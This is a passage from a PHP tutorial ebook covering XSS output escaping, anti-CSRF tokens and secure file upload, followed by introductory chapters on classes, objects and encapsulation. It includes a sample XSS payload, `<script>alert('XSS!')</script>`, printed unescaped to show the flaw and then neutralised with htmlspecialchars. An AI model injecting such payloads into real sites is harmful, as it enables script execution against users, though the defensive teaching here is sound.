 // Handle the error or prevent the record from being saved  
 } else {  
 // Save the email address in the database  
 }

Outlet exhaust :

Properly escape all dynamic data before inserting it into an HTML page. This means converting all special characters into HTML entities, so that they are treated as plain text by the browser rather than as HTML or JavaScript code.

In our comment form example, before displaying the comments on the web page, we need to escape special characters such as <, >, &, **"**, etc., to prevent the execution of malicious scripts.

 

If you run the following code, a JavaScript window is displayed with the text "XSS!" :

 

  $comment = "<script>alert('XSS!');</script>";  
 echo "<div>$comment</div>";

 

In PHP, to escape the contents of the $comment variable, simply use the htmlspecialchars() function as follows:

 

 $comment = "<script>alert('XSS!');</script>";  
  
 // Escape special characters  
 $comment\_echappe = htmlspecialchars($comment);  
  
 // Display the escaped comment on the web page  
 echo "<div>$comment\_echappe</div>";

 

In this code, the **htmlspecialchars()** function is used to escape special characters in the comment, meaning that special characters such as <, >, &, ", etc., will be converted into HTML entities to render them harmless when displayed on the web page. Finally, the escaped comment is displayed inside a <div> tag on the web page.

 

When this portion of code is executed and displayed on the web page, the <script> tag will not be interpreted as JavaScript code to be executed, but rather as plain text displayed on the screen. So, instead of displaying an alert dialog, the browser will simply display <script>alert('XSS!');</script> and this indicates that the <script> tag and its contents, including the call to the alert() function, have been displayed as plain text on the web page. This shows that the htmlspecialchars() function has successfully escaped special characters, preventing the JavaScript code from being executed as an XSS attack.

 

By applying these good security practices, developers can significantly reduce the risk of stored XSS attacks, and so protect the security and privacy of users of their web applications.

 

## Cross-Site Request Forgery (CSRF)

Cross-Site Request Forgery (CSRF) is a malicious attack that exploits the trust of an authenticated user to perform unauthorized actions without their knowledge. The attack works by exploiting the fact that web browsers automatically send authentication cookies with every request sent to a site, even if these requests were initiated from another site.

###  

### How CSRF attacks work

The CSRF attack is usually carried out by inducing an authenticated user to visit a malicious site containing links or forms designed to perform specific actions on a target site. When the user visits the malicious site, requests generated by the latter are automatically sent to the target site, using the user's authentication information, without the user being aware of the attack.

 

Implementing anti-CSRF tokens

The main preventive measure against CSRF attacks is the use of anti-CSRF tokens, also known as synchronous tokens or anti-bounce tokens. These tokens are unique random values associated with each user and each session. They are generated on the server side and included in forms or POST requests sent by the user. When a request is submitted, the server checks that the corresponding anti-CSRF token is valid for that specific session and action. If the token is invalid or missing, the request is rejected.

 

Example of anti-CSRF token implementation

Here's a simple example of how to generate and validate an anti-CSRF token in PHP :

 

<?php  
 session\_start();  
  
 // Generate anti-CSRF token  
 if (!isset($\_SESSION\['csrf\_token'\])) {  
 $\_SESSION\['csrf\_token'\] = bin2hex(random\_bytes(32));  
 }  
  
 // Inclusion of anti-CSRF token in a form  
 echo '<form action="csrf\_processing.php" method="post">';  
 echo '<input type="hidden" name="csrf\_token" value="' . $\_SESSION\['csrf\_token'\] . '">';  
 echo '<input type="submit" value="Submit">';  
 echo '</form>';  
  
 // Server-side validation of anti-CSRF token  
 if (isset($\_POST\['csrf\_token'\]) && $\_POST\['csrf\_token'\] === $\_SESSION\['csrf\_token'\]) {  
 // Processing the request  
 echo "Request processed successfully";  
 } else {  
 // Reject request  
 echo "Error: invalid CSRF request.";  
 }  
?>

 

This PHP code illustrates the use of anti-CSRF tokens to prevent CSRF attacks on a web form. Here is a detailed explanation of each part of the code:

**session\_start():** This function starts a new session or resumes an existing one. Sessions are used to store session variables, such as the anti-CSRF token, which can be accessed via different pages.

 

**Anti-CSRF token generation**: The code checks whether the anti-CSRF token is already present in the session. If not, a new token is generated using the **random\_bytes()** function to create a 32-byte random string, then **bin2hex()** to convert this string to a hexadecimal representation.

 

**Inclusion of the anti-CSRF token in a form**: The anti-CSRF token is then included in an HTML form as a hidden field (<input type="hidden">). This ensures that the token is submitted with the rest of the form data when it is sent to the server.

 

**Server-side anti-CSRF token validation**: When the form is submitted, the anti-CSRF token is also submitted along with the form data. The code checks whether the submitted token matches the token stored in the session. If the two tokens match, the request is legitimate and can be processed successfully. Otherwise, an invalid CSRF error is displayed.

 

This anti-CSRF token mechanism ensures that each request submitted from the form contains a unique and valid token, preventing CSRF attacks by verifying that the request actually comes from the authorized website.

 

To illustrate the generation and validation of an anti-CSRF token in PHP, we're going to create two files in the ebookphp directory: the file named form\_csrf.php, which contains a form, and the file named csrf\_processing.php, which will process the data submitted by this form. Here's a simple example of the code for these two files:

 

File 1: form\_csrf.php :

 

<?php  
 session\_start();  
  
 // Generate anti-CSRF token  
 if (!isset($\_SESSION\['csrf\_token'\])) {  
 $\_SESSION\['csrf\_token'\] = bin2hex(random\_bytes(32));  
 }  
  
 // Display form with anti-CSRF token  
 echo '<form action="csrf\_processing.php" method="post">';  
 echo '<input type="text" name="name" placeholder="Name">';  
 echo '<input type="hidden" name="csrf\_token" value="' . $\_SESSION\['csrf\_token'\] . '">';  
 echo '<input type="submit" value="Submit">';  
 echo '</form>';  
?>

 

Result:

 

![Image](images/image-169.png)

 

This PHP code generates an anti-CSRF token and displays an HTML form with this token included. Here's a line-by-line explanation:

 

session\_start();: Starts or resumes an existing session.

 

if (!isset($\_SESSION\['csrf\_token'\])) { ... }: Checks whether the '**csrf\_token'** key already exists in the session. If it does not exist, an anti-CSRF token is generated.

 

$\_SESSION\['csrf\_token'\] = bin2hex(random\_bytes(32));: Generates a random anti-CSRF token using the **random\_bytes(32)** function to obtain 32 bytes of random data, then the **bin2hex()** function to convert these bytes into a hexadecimal string.

 

echo '<form action=" csrf\_processing.php " method="post">';: Starts HTML form tag with action pointing to file csrf\_processing.php and POST method.

 

echo '<input type="text" name="lastname" placeholder="Lastname">';: Displays a text input field for the name.

 

echo '<input type="hidden" name="csrf\_token" value="' . $\_SESSION\['csrf\_token'\].'">';: Displays a hidden field for the anti-CSRF token, whose value is the token stored in the session.

 

echo '<input type="submit" value="Submit">';: Displays a submit button to send the form.

 

In short, this code generates a form with an anti-CSRF token included to protect against CSRF attacks when the form is submitted.

 

File 2: csrf\_processing.php

 

<?php  
 session\_start();  
  
 // Anti-CSRF token validation  
 if (isset($\_POST\['csrf\_token'\]) && $\_POST\['csrf\_token'\] === $\_SESSION\['csrf\_token'\]) {  
// Request processed if token is valid  
 echo "Request processed successfully";  
 } else {  
 // Reject the request if the token is invalid  
 echo "Error: invalid CSRF request.";  
 }  
?>

 

This PHP code validates the anti-CSRF token submitted with the form in form\_csrf.php. Here's a line-by-line explanation:

 

session\_start();: Starts or resumes an existing session.

 

if (isset($\_POST\['csrf\_token'\]) && $\_POST\['csrf\_token'\] === $\_SESSION\['csrf\_token'\]) { ...}: Checks whether the anti-CSRF token submitted with the form ($\_POST\['csrf\_token'\]) matches the token stored in the session ($\_SESSION\['csrf\_token'\]). If the two tokens match, the request is valid and can be processed.

 

echo "Request processed successfully.";: Displays a message indicating that the request has been processed successfully if the token is valid.

 

else { ... }: Otherwise, if the tokens don't match, the request may be a CSRF attack and is rejected.

 

echo "Error: invalid CSRF request.";: Displays an error message indicating that the CSRF request is invalid.

 

In short, this code ensures security by checking the authenticity of the anti-CSRF token submitted with the form before processing the request, thus protecting against CSRF attacks. If the token is valid, the request is processed successfully; if not, it is rejected.

 

To test this process, go to form\_csrf.php in your browser and submit the form. You should see the message "Request processed successfully" if the anti-CSRF token is valid. If you try to submit the form without a token or with an invalid token, you'll see the message "Error: invalid CSRF request.". If you try to go directly to the csrf\_processing.php file, you'll also get the message: "Error: invalid CSRF request.

 

### Secure File Upload

 

User upload of files is a common feature of many web applications. However, this presents potential security risks if uploaded files are not properly managed. In this section, we'll look at the risks associated with file uploads and best practices for securing this functionality.

 

Risks related to File Uploads

The main risks associated with file uploads by users include :

 

*   Malicious file injection: Attackers can upload files containing malicious code, such as PHP scripts, malware or executable files, to exploit vulnerabilities on the server.

 

*   Size overrun: Users can upload large files to saturate the storage system or cause a denial of service.

 

*   Fake File Extensions: Attackers can rename files with deceptive extensions to bypass security checks based on file extension.

 

*   Security vulnerabilities: Configuration errors or code vulnerabilities can be exploited by attackers to manipulate uploaded files or access sensitive files on the server.

 

File validation and cleanup

 

Here are a few best practices for secure file uploads:

 

**File Type Validation**: Limit the file types allowed by checking the file extension and MIME type of the uploaded file. Don't trust the file extension alone, as it can easily be falsified.

 

**Limit File Size**: Set a size limit for uploaded files to prevent oversizing and system abuse.

 

**Rename uploaded files**: Rename uploaded files to give them unique, secure names, to avoid name conflicts and the risks associated with running malicious files.

 

**Secure storage**: Store uploaded files in a secure directory outside the web server root to limit direct access to files by unauthorized users.

 

**Antivirus Scan**: Use antivirus scanning tools to check uploaded files for malware or dangerous content.

 

**Permission management:** Ensure that uploaded files have appropriate permissions to prevent unauthorized access and security vulnerabilities.

 

By implementing these security practices when managing file uploads, you can effectively reduce the security risks associated with this functionality and protect your application against potential attacks.

 

Here is an example of PHP code for handling file uploads with built-in security measures that you can place in, for example, an "upload\_file.php" file for testing purposes.

 

 

<?php  
 // Check if the form has been submitted  
 if ($\_SERVER\["REQUEST\_METHOD"\] == "POST") {  
  
 // Check the file  
 if ($\_FILES\["file"\]\["error"\] == UPLOAD\_ERR\_OK) {  
 // Destination directory path  
 $uploadDir = "uploads/";  
  
  // File name  
  $fileName = basename($\_FILES\["file"\]\["name"\]);  
  
  // Full file path on the server  
  $filePath = $uploadDir . $fileName;  
  
 // Get the file extension  
  $fileExtension = strtolower(pathinfo($filePath, PATHINFO\_EXTENSION));  
  
  // Check file MIME type  
  $fileMimeType = mime\_content\_type($\_FILES\["file"\]\["tmp\_name"\]);  
 $allowedMimeTypes = array('image/jpeg', 'image/png', 'application/pdf');  
  
 if (!in\_array($fileMimeType, $allowedMimeTypes)) {  
 echo "Error: File type not allowed.";  
 return;  
 }  
  
 // Check file extension  
 $allowedExtensions = array('jpg', 'jpeg', 'png', 'pdf');  
  
 if (!in\_array($fileExtension, $allowedExtensions)) {  
 echo "Error: File extension not allowed.";  
 return;  
 }  
  
 // Move uploaded file to destination directory  
 if (move\_uploaded\_file($\_FILES\["file"\]\["tmp\_name"\], $filePath)) {  
 echo "File uploaded successfully.";  
 } else {  
 echo "Error uploading file.";  
 }  
 } else {  
 echo "Error: " . $\_FILES\["file"\]\["error"\];  
 }  
}  
  
?>  
<!DOCTYPE html\>  
<html lang\="fr">  
 <head\>  
 <meta charset\="UTF-8">  
 <meta name\="viewport" content\="width=device-width, initial-scale=1.0">  
 <title\>Secure File Upload</title\>  
 </head\>  
 <body\>  
 <h2\>Secure File Upload</h2\>  
 <form action\="<?php echo htmlspecialchars($\_SERVER\["PHP\_SELF"\]); ?>" method\="post" enctype\="multipart/form-data">  
 <label for\="file">Select a file:</label\>  
 <input type\="file" id\="file" name\="file" accept\="image/jpeg, image/png, application/pdf">  
 <button type\="submit">Upload</button\>  
 </form\>  
 </body\>  
</html\>

 

 

This PHP code ensures security when uploading files to a server. Here's how it works in detail:

 

1.  The code first checks whether the form has been submitted, using $\_SERVER\["REQUEST\_METHOD"\] == "POST" to ensure that processing only takes place when the form is submitted.

 

1.  Next, it checks that no problems have occurred during file upload using $\_FILES\["file"\]\["error"\] == UPLOAD\_ERR\_OK. This ensures that the file has been uploaded successfully, before proceeding with further checks.

 

1.  It determines the file's destination path using a predefined directory and the name of the uploaded file using basename($\_FILES\["file"\]\["name"\]).

 

1.  Next, it checks the MIME type of the uploaded file using mime\_content\_type($\_FILES\["file"\]\["tmp\_name"\]) and compares it with a list of authorized MIME types ($allowedMimeTypes). This ensures that only specified file types are allowed to be uploaded.

 

Note that the MIME (Multipurpose Internet Mail Extensions) type is a standardized identifier used to specify the type of content in a file. It tells the server how to process the file's contents according to its type. For example, the MIME type "text/html" indicates that the file is an HTML document, while "image/jpeg" indicates that it is an image in JPEG format. MIME types are used by Web servers to determine how to serve the contents of a file to Web browsers or other applications.

 

1.  The code also checks the file extension using pathinfo($filePath, PATHINFO\_EXTENSION) and compares it with a list of permitted extensions ($allowedExtensions). This additions an extra layer of security by ensuring that the uploaded file has the correct extension.

 

1.  If the MIME type and file extension are valid, the file is moved to the destination directory using move\_uploaded\_file(). Otherwise, appropriate error messages are displayed to inform the user of any problems encountered when uploading the file.

 

1.  Finally, an HTML form is displayed to allow the user to select and upload a file. The form sends data to the current PHP script ($\_SERVER\["PHP\_SELF"\]) via the POST method with enctype="multipart/form-data", enabling files to be uploaded.

 

This code ensures enhanced security when uploading files by checking both the MIME type and extension of the file being uploaded, thus considerably reducing the risk of malicious or dangerous files being uploaded to the server.

 

## Conclusion

This chapter on PHP security has highlighted the crucial importance of securing web applications against a variety of malicious threats and attacks. We've explored the various aspects of security in depth, starting with SQL injection attacks, which represent one of the most common and potentially devastating threats to web applications. By understanding how attackers exploit security holes to manipulate SQL queries and compromise database data, developers can implement preventative measures such as the use of prepared queries and bound parameters to guard against these attacks.

 

We also looked at Cross-Site Scripting (XSS), another major threat that allows attackers to inject malicious JavaScript code into web pages, thereby compromising end-user security. By using techniques such as special character escaping and user input validation, developers can reduce the risk of XSS exploitation and protect users from attack.

 

Cross-Site Request Forgery (CSRF) was also discussed, highlighting the potential dangers of forged requests that exploit user trust to perform unauthorized actions on websites. By using anti-CSRF tokens and validating server-side requests, developers can mitigate this risk and guarantee the integrity of user actions.

 

Finally, we examined the risks associated with file downloads, highlighting potential vulnerabilities that can be exploited by attackers to execute malicious code on the server. By imposing strict restrictions on permitted file types, checking MIME signatures and limiting download permissions, developers can reduce the risk of these vulnerabilities being exploited and protect system integrity.

 

In conclusion, PHP security is an essential aspect of modern web development. By understanding the various threats and implementing robust security practices throughout the development process, developers can create secure and reliable web applications that protect their users' sensitive data and guarantee a safe and secure user experience.

 

 

# SECTION E

# OBJECT-ORIENTED PROGRAMMING IN PHP

 

 

Object-oriented programming (OOP) is a fundamental programming paradigm based on the creation and manipulation of objects. In PHP, OOP offers a powerful means of structuring and organizing code, enabling greater reusability, modularity and more efficient management of data and functionality.

 

The distinction between procedural programming and object-oriented programming (OOP) lies in their fundamentally different approach to code structuring. In procedural programming, programs are built around functions, where data is generally directly accessible and manipulable. In object-oriented programming, on the other hand, code is organized around entities called objects. These objects encapsulate both the data (called properties or attributes) and the functionalities (called methods) that act on this data.

 

It's important to note that OOP is not a new programming language per se, but rather a programming paradigm widely used in modern application development. This approach offers a more organized structure for designing and managing code, dividing it into reusable objects with specific characteristics and behaviors.

 

As for PHP, a popular and flexible programming language, it offers native support for OOP. This enables developers to create more robust and scalable applications using OOP concepts.

 

In short, OOP offers an alternative and efficient way of organizing code, in which everything is considered an object. Each object has attributes for storing data and methods for performing operations on that data. This approach promotes code reusability, modularity and maintainability, making it an attractive choice for many software development projects.

 

In this section, we'll explore in detail the fundamental principles of OOP in PHP, as well as good development practices. Here's an overview of the topics we'll cover:

 

Chapter 1: Classes and objects: This chapter lays the foundations of OOP in PHP by introducing the concepts of classes and objects. Readers learn how to define classes, create object instances and access their properties and methods.

 

Chapter 2: Encapsulation and data modeling: This chapter explores the notion of encapsulation in PHP and shows how to model data using classes.

 

Chapter 3: Inheritance in PHP : This chapter explores inheritance in PHP, allowing you to create class hierarchies to reuse and extend code.

 

Chapter 4: Interfaces and abstract classes : This chapter introduces interfaces and abstract classes in PHP. You'll learn how to define contracts with interfaces and how to create abstract classes to define methods common to several classes.

 

Chapter 5: Exception handling: This chapter covers exception handling in PHP, enabling you to handle errors and exceptional situations cleanly and efficiently in your applications.

 

Chapter 6: Namespaces: This chapter explores namespaces in PHP, offering you a way to structure your code logically and prevent name conflicts.

 

Chapter 7: Features: This chapter introduces features in PHP, enabling you to reuse code between several classes without using multiple inheritance.

 

Chapter 8: Magic methods: This chapter explores PHP's magic methods, special methods that are very useful in PHP.

 

This section offers an in-depth exploration of object-oriented programming in PHP, equipping developers with the knowledge and skills they need to design and develop robust, scalable and easy-to-maintain PHP applications.

 

 

# Chapter 14

# Classes and objects

 

 

In the world of object-oriented programming in PHP, classes and objects are the fundamental elements that enable code to be efficiently structured and organized. A class can be seen as a model or blueprint for creating objects, while an object is a concrete instance of a class, with its own data (properties) and behavior (methods).

 

This chapter plunges us into the fascinating world of classes and objects in PHP. We'll discover how to define and create classes, instantiate objects, access their properties and methods, and manage the visibility of class members. We'll also explore the key principles of encapsulation, abstraction and code reuse through classes and objects.

 

This chapter will provide you with the tools you need to master the essential concepts of classes and objects and apply them effectively in your PHP development projects. Get ready for an exciting journey into the heart of object-oriented programming in PHP!

 

 

## Defining and creating classes

Classes are the foundation of object-oriented programming in PHP. A class is a data structure that defines the form of an object. It encapsulates the data (properties) and behavior (methods) associated with a specific type of object. Here's a simple analogy to understand what a class is in object-oriented programming:

 

Think of a class as a blueprint or model for building cars, for example. In this model, you specify the characteristics common to all the cars you're going to build, such as the number of doors, the number of wheels, the make, the color and so on. This model also defines methods (such as starting, accelerating, braking) associated with a car.

 

Once you've defined this class, you can create specific instances of it, which are like individual houses built according to the plan. Each instance of the "Car" class would be a specific car with its own values for properties such as make, model and color.

 

![Image](images/image-170.png)

 

In short, a class is a model or blueprint that defines the structure and behavior of a certain type of object, while an instance is a specific copy of that class, with its own values for the properties defined in the class.

 

### Class definition

 

In PHP, a class is declared using the **class** keyword, followed by the class name and its properties and methods enclosed in braces. 

The class name must begin with a letter or underscore (\_), followed by letters, numbers or underscores.

Naming conventions recommend using **PascalCase** notation to name classes, which means that every word in the class name begins with a capital letter, with no spaces or special characters. In particular, the first letter of a class name is capitalized.

 

Here's the general syntax for defining a class:

 

![Image](images/image-171.png)

 

To better understand these concepts, let's create a directory called "phppoo" on the server. If you're using XAMPP locally, you can create this directory in the "htdocs" folder. In this directory, we'll put illustrative examples of all the concepts covered in this section.

 

### Class properties (attributes)

 

Class **properties** are variables declared inside the class.

They define the characteristics or data associated with each instance of the class.

Naming conventions generally recommend the use of **camelCase** notation for naming properties, which means that the first word begins with a lowercase letter and subsequent words begin with an uppercase letter.

 

Example:

 

 

 class MyClass {  
 public $myProperty;  
 private $otherProperty;  
}

 

 

This code defines a class named "MyClass" in PHP. Inside the class, we declare two properties: "$myProperty" and "$otherProperty". The "$ myProperty" property is declared as public, meaning that it can be accessed from outside the class. On the other hand, the "$otherProperty" property is declared as private, meaning that it can only be accessed inside the class itself and cannot be accessed from outside. Private properties are used to encapsulate data and guarantee its integrity by limiting direct access.

 

### Class methods

 

Class methods are functions declared inside the class.

They define the actions or behaviors associated with each instance of the class.

Naming conventions generally recommend the use of camelCase notation to name methods, in the same way as for properties.

 

**Example**:

 

 

 class MaClasse {  
 public function myMethod() {  
 // Method body...  
 }  
 private function otherMethod() {  
 // Body of method...  
 }  
 }

 

 

This code defines a class named "MyClass" in PHP. Inside the class, we define two methods: "myMethod()" and "otherMethod()". The "myMethod()" method is declared as public, meaning it can be called from outside the class. On the other hand, the "otherMethod()" method is declared as private, meaning that it can only be called from within the class itself and is not accessible from outside. Private methods are used to encapsulate the class's internal logic and are not intended to be called directly from outside the class. This makes it possible to protect and restrict access to certain class functionalities.

In object-oriented programming, the term "methods" is used to designate functions associated with a class, while the term "functions" is generally reserved for independent blocks of code. So, when we discuss object-oriented programming, we refer to "methods" to describe the specific actions or behaviors of an object, as opposed to "functions" which are used in a more general, class-independent context.

 

Practical example: creating a class

In the main phpoo directory, create two new files, to be named index.php and Users.php respectively (make sure the first letter is capitalized). Then, in the latter file, define a class named Users, also with an initial capital letter to match the file name.

 

<?php  
  
 class Users {  
 public $name;  
 public $firstname;  
 public $age;  
 public $email;  
  
 public function logIn() {  
 echo "I'm a member, so I can connect";  
 }  
  
 public function logOut() {  
 echo "I can log out";  
 }  
 }  
?>

 

 

### This code defines a class named "Users" that represents users with several attributes such as name, firstname, age, and email. The class also has two public methods: "logIn()" and "logOut()".

###  

### The "logIn()" method displays a message indicating that a member can log in, while the "logOut()" method displays a message indicating that a user can log out. These methods provide specific functionality for managing user logins and logouts.

###  

### Object instantiation

 

Once a class has been defined, we can create objects (instances) of that class using the **new** keyword. 

 

![Image](images/image-172.png)

 

In the index.php file addition the following code:

 

For example:

 

 

<?php  
 require\_once "Users.php";  
 $user1 \= new Users();

 

 

This PHP code begins by including (with require\_once) the file Users.php, which contains the definition of the Users class. Next, it creates a new instance of the Users class using the keyword new, and assigns this instance to the variable $user1. In other words, it creates a new object of type "Users", which can now access the properties and methods defined in the "Users" class.

 

### Write access to objects

 

Write access to objects means that we can modify (or assign) the values of an object's properties. This allows us to update the data stored in the object's properties.

 

In the context of the Users class, we can write access to the properties of the $user1 object as follows:

 

 

 $user1\->name\="Dupont" ;  
 $user1\->firstname\="Eric" ;  
 $user1\->age\= 30 ;  
 $user1\->email\="dupont-eric@gmail.com" ;

 

This code, to be integrated into the index.php file where a $user1 object is already instantiated from the Users class, is used to assign values to the properties of the $user1 object of the Users class. More precisely :

 

*   "$user1->name = "Dupont";" assigns the value "Dupont" to the "name" property of the "$user1" object.
*   "$user1->firstname = "Eric";" assigns the value "Eric" to the "firstname" property of the "$user1" object.
*   "$user1->age = 30;" assigns the value 30 to the "age" property of the "$user1" object.
*   "$user1->email = "dupont-eric@gmail.com";" assigns the value "dupont-eric@gmail.com" to the "email" property of the "$user1" object.

 

By assigning these values, we initialize the data for the user represented by the "$user1" object.

 

### Access to read objects

 

Read access to the $user1 object means we can retrieve its property values, but we can't modify them directly. This means we can use the values stored in the object's properties, but we can't write new values directly to these properties.

 

In the context of the Users class, if we want to access the read properties of the $user1 object instantiated above, we can do so as follows:

 

 // Code to add to index.php  
 // Read access to $user1 object properties  
 echo "Name: " . $user1\->name . "<br>";  
 echo "First name: " . $user1\->firstname . "<br>";  
 echo "Age: " . $user1\->age . "<br>";  
 echo "Email: " . $user1\->email . "<br>";

 

This allows us to display the property values of the $user1 object. Note the little arrow (->) used to call properties.

If you are currently running the index.php file, the result displayed will be similar to the following:

![Image](images/image-173.png)

 

### Access to methods

 

Methods are accessed through the objects of the class. Once an object has been created from the class, you can call the class's methods using arrow notation (**\-**\>). 

For example, in the index.php file where we've already instantiated a $user1 object, we can call the logIn() method on this object.

 

 

 $user1\->logIn();

 

This will execute the code inside the logIn() method.

 

![Image](images/image-174.png)

###  

### Read access to an object's private properties

 

Access to an object's private properties is an important concept in object-oriented programming (OOP). Let's modify the Users class as follows:

 

<?php  
  
 class Users {  
 private $name \= "Dupont" ;  
 private $firstname \= "Karine" ;  
 private $age \= 27 ;  
 private $email \= "dupont-karine@gmail.com" ;  
  
 }

 

 

In this example of the Users class, we define four **private** properties using the "**private**" keyword: $name, $firstname, $age and $email. 

 

The initial values of the $name, $firstname, $age and $email properties are "Dupont", "Karine", 27 and "dupont-karine@gmail.com" respectively. These values are assigned when the properties are declared.

 

Let's now update the index.php file to try and access the $name, $firstname, $age and $email properties from outside the Users class. Here are the current contents of index.php :

 

  
<?php  
  
 require\_once "Users.php";  
  
 $user1 = new Users();  
 //Read access to $user1 object properties  
 echo "Name : " . $user1\->name . "<br>";  
 echo "First name : " . $user1\->firstname . "<br>";  
 echo "Age : " . $user1\->age . "<br>";  
 echo "Email : " . $user1\->email . "<br>";

 

 

If you run index.php, you'll get the following error:

 

![Image](images/image-175.png)

 

This error indicates that we are trying to access a private property ($name) from outside the Users class, which is not allowed. Private properties are only accessible within the class in which they are declared. When we try to access them from another context, as in the index.php file, PHP generates a fatal error. So how do we access private properties from outside the class in which they are defined?

 

The solution lies in the creation of public methods within the class, which allow access to these private attributes. Then, outside the class, these public methods can be used to access the object's private attributes. These methods act as intermediaries, providing a controlled and secure means of accessing and manipulating private attributes, while preserving the encapsulation of the class.

 

Let's modify the Users class as follows:

 

<?php  
 Class Users {  
 private $name \= "Dupont" ;  
 private $firstname \= "Karine" ;  
 private $age \= 27 ;  
 private $email \= "dupont-karine@gmail.com" ;  
  
 public function getInfosUser() {  
 echo "Name: $this->name <br\>";  
 echo "Firstname: $this->firstname <br\>";  
 echo "Age: $this->age <br\>";  
 echo "Email additionress: $this->email";  
 }  
  
 }  
 

 

In this version of the Users class, we've added a public method named **getInfosUser()** that displays user information. This method is defined inside the Users class. It uses the echo statement to display the values of the last name, first name, age and e-mail address properties of the current object (represented by **$this**). Note that the **$this** variable is a very important keyword in PHP, and refers to the object currently in use.

 

Within the getInfosUser() method, private attribute values are accessed using the syntax

$this->name, $this->firstname, $this->age and $this->email. The -> operator is used to access the properties of the current object.

 

Using the getInfosUser() method, you can retrieve and display user information from an instance of the Users class. For example, in index.php, we have an instance of the Users class named $user1. You can call the getInfosUser() method on this instance to display the details of this user.

 

<?php  
  
 require\_once "Users.php";  
  
 $user1 \= new Users();  
  
 //Call getInfosuser() method  
 $user1->getInfosUser();

 

 

In this code, after including the Users.php file and instantiating a new object of this class using the new operator and storing this instance in the $user1 variable, the getInfosUser() method is called on the $user1 object.

 

The result of executing this code would be the display of user information such as surname, first name, age and email address, as the getInfosUser() method is responsible for displaying this information. The result would be similar to the following:

 

![Image](images/image-176.png)

 

In short, it's important to understand that access to private attributes from outside the class in which they are defined is via public methods also defined in the same class.

###  

### Read access to an object's private properties

 

Let's take the example of the Users class and declare the private attributes name, firstname, age and email without initializing them.

 

 <?php  
  
 Class Users {  
 private $name ;  
 private $firstname ;  
 private $age ;  
 private $email ;  
 }

 

 

If you now try to initialize these attributes directly from outside the class, for example from the index.php file, using the code :

 

 <?php  
  
 require\_once "Users.php";  
  
 $user1 = new Users();  
  
 $user1\->name = "Dupont";  
 $user1\->firstname = "Claire";  
 $user1\->age = 32;  
 $user1\->email = "dupond-claire@gmail.com";

 

 

When this code is executed, a fatal error is generated, indicating that access to private attributes is not allowed from outside the class. To resolve this error and allow write access to private attributes from outside the class, we need to provide public methods in the class that allow these attributes to be modified.

In the Users class, we create a new public method named initialize() for example:

 

 

 public function initialize($lastName, $firstName, $age, $email){  
 $this\->name \= $lastName;  
 $this\->firstname \= $firstName;  
 $this\->age \= $age;  
 $this\->email \= $email;  
 }

 

In this code, we've created a public method that takes the user's surname, first name, age and email as parameters, then assigns them to the corresponding properties of the current object ($this). This method thus initializes the values of the object's private attributes from the values supplied as arguments. We can now use this method to access the private attributes name, first name, age and email. Let's call this method in the index.php file:

 

 

  require\_once "Users.php";  
  
 $user1 = new Users();  
  
 $user1\->initialize("Salim", "Zakaria",32, "salim@gmail.com");

 

 

 

Code execution generates no errors. To retrieve the values of the last name, first name, age and email attributes initialized by the initialize() method, let's also call the getInfosUser() method:

 

 

 require\_once "Users.php";  
  
 $user1 = new Users();  
  
 $user1\->initialize("Salim", "Zakaria",32, "salim@gmail.com");  
 $user1\->getInfosUser();

 

 

Executing this code will produce the following result:

 

![Image](images/image-177.png)

 

In short, private attributes are accessed via public methods that act as interfaces to manipulate the data encapsulated in the class's objects. This maintains encapsulation and controls access to private data, guaranteeing system security and consistency.

 

## Conclusion

In this chapter, we explored in depth the fundamental concept of object-oriented programming: classes and objects. We've learned how to define classes, create objects from these classes, and manipulate the data encapsulated inside objects.

 

We have also studied the different types of properties and methods. These concepts enable us to create complex data structures and modular, extensible software systems.

 

By understanding the principles of object-oriented programming, we're better equipped to design robust, maintainable and scalable applications. By making effective use of classes and objects, we can organize our code in a more logical and intuitive way, making it easier to develop and maintain our projects.

 

In conclusion, classes and objects are essential elements of object-oriented programming in PHP, and mastering them is a must for any PHP developer looking to create modern, high-performance applications. By continuing to explore and practice these concepts, we're on our way to becoming more competent and efficient PHP developers.

 

 

## EXERCISES

 

### Exercise 24

 

Write a class representing a city. It should have properties like name, department, region, and population count, and a method displaying "City X is in department Y of region Z and has N inhabitants".

Create city objects, assign their properties, and use the display method.

 

### Exercise 25

 

Create a class Person with the following attributes: name, first name, age. The class should have a method presentation() that displays a string containing the person's information.

 

Then, create two Person objects with different information and call the presentation method.

# Chapter 15

# Data Encapsulation and Modeling

 

 

In this chapter, we'll explore the fundamental concept of encapsulation in PHP object-oriented programming (OOP), and its role in data modeling and management. Encapsulation, one of the pillars of OOP, consists in grouping data and the methods that act on that data within a single entity, called a class. This approach guarantees data integrity and security by controlling access and manipulation.

 

We also continue to examine the different levels of visibility of properties and methods, such as public, private and protected, and their impact on encapsulation. By understanding these visibility levels, you'll be able to design well-structured and secure classes, while facilitating code reuse and application maintenance.

 

Finally, we'll look at data modeling through encapsulation, implementing model classes to efficiently represent entities and relationships in an information system. You'll learn how to use getters and setters to control access to properties, guarantee data consistency and simplify object management.

 

By combining encapsulation with other OOP concepts, such as inheritance and polymorphism, which we'll develop in the following chapters, you'll be able to create robust, flexible web architectures capable of meeting the evolving requirements of modern IT projects.

 

## Encapsulation: protecting data and methods

In PHP object-oriented programming, encapsulation refers to the grouping of data (properties, etc.) and the actions used to manipulate them within a class.

 

Encapsulation is very important for limiting access to properties from outside the class. To determine who can access the various properties, methods and constants of our classes, we use access limiters, also known as visibility levels, represented by the keywords public, private and protected.

 

### Principles of encapsulation :

 

Encapsulation concerns the visibility and accessibility of class properties and methods.

When creating a new class, it's crucial to determine which properties and methods must be accessible from outside the class.

As we saw in the previous chapter, properties, methods or constants defined with the **public** keyword are accessible everywhere, both inside and outside the class. Properties, methods or constants defined with the **private** keyword can only be accessed inside the class that defined them.

 

In the upcoming chapter on inheritance, we'll discover that properties, methods or constants defined with the **protected** keyword are accessible inside the class that defined them, as well as in child classes that inherit from this class or in the parent class itself.

 

By convention, attributes are declared as private, as it is risky to access a class attribute directly. To access these attributes, we use public methods.

In most cases, we define our methods with the keyword public and our properties with the keywords **protected** or **private**. However, it should be noted that this principle is not absolute and may vary according to the specific needs of each application.

## Defining and using getters and setters methods

In this section, we explore a fundamental concept in object-oriented programming: getters and setters. These methods, also known as accessors and mutators, are used to access an object's properties (getters) and to modify these properties in a controlled way (setters).

 

Getters are used to retrieve the values of an object's properties, while setters are used to set or modify these values.

We'll look at how to define these methods in a PHP class, as well as their practical use to encapsulate data, control access and guarantee data consistency within our application.

 

Let's go back to the Users class to see how to define and use getters and setters methods:

 

<?php  
 class Users {  
 private $name;  
 private $age;  
  
 // Getter for property $name  
 public function getName() {  
